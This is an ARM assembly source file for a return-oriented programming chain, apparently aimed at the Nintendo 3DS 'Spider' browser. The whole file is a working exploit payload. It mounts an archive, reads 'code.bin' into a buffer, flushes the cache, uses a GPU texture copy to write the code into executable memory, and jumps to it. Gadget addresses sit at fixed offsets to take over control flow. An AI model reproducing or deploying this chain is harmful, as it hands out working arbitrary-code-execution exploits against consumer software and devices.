	.arm
	.text

#define SPIDER_ROP_LOC
#include "rop.h"

#define CODE_SIZE 0x00004000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC+SPIDER_ARM_CODE_OFFSET, CODE_TARGET, CODE_SIZE)
	rop_sleep(1000000000)
	rop_jump_arm
FileName:
#ifndef SPIDER_ARM_CODE
	#define SPIDER_ARM_CODE dmc:/code.bin
#endif
#define S_(x)	#x
#define S(x)	S_(x)
	.string16 S(SPIDER_ARM_CODE)
.org 0x0F4
	.word ROP_LOC+_start+0x8C
.org 0x128
	.word ROP_LOC+_start, 0, POP_PC
.org 0x158
	.word POP_PC, POP_PC
.org 0x21C
	.word MAGIC
